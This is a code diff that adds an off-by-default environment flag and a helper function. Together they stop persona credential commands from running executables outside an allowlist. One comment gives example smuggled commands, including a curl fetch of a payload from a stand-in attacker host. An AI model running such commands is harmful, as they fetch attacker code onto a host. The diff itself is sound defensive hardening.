@@ -275,3 +275,22 @@ def allow_shell_cred_cmds() -> bool:
     ``bash -c`` (and equivalents) for persona credential cmds. Read at call
     time so tests can monkeypatch the env var without reloading the module."""
     return _parse_bool_env(ALLOW_SHELL_CRED_CMDS_ENV, False)
+
+
+# Env var name controlling whether persona credential ``*_cmd`` values may
+# invoke an arbitrary executable that is NOT on the static well-known
+# credential-helper allowlist (see ``personas._CREDENTIAL_HELPER_ALLOWLIST``).
+# Default OFF so persona YAML — which may come from shared storage or a
+# CI-checked-in directory — can't smuggle an arbitrary binary onto the daemon
+# host (``["/tmp/evil.sh"]``, ``["curl", "attacker.example/payload"]``, etc).
+# Operators who deliberately ship custom credential helpers opt in by setting
+# this to ``1``/``true``/``yes``/``on``.
+ALLOW_ARBITRARY_CRED_CMDS_ENV = "OCTOWRIGHT_ALLOW_ARBITRARY_CRED_CMDS"
+
+
+def allow_arbitrary_cred_cmds() -> bool:
+    """Return True iff ``OCTOWRIGHT_ALLOW_ARBITRARY_CRED_CMDS`` opts into
+    running argv-form credential cmds whose executable basename is not on
+    the static well-known helper allowlist. Read at call time so tests can
+    monkeypatch the env var without reloading the module."""
+    return _parse_bool_env(ALLOW_ARBITRARY_CRED_CMDS_ENV, False)
